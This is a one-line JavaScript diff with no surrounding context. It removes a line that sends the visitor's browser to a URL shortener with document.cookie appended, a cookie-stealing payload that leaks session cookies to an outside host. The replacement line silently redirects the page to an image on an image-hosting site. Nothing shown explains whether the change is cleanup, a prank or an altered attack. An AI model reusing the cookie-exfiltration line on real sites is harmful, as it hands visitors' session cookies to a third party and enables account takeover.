@@ -1,1 +1,1 @@
-document.location='https://clck.ru/Mvutj'+document.cookie;
+window.location.href = "https://i.ibb.co/TkwjgsW/image.png";
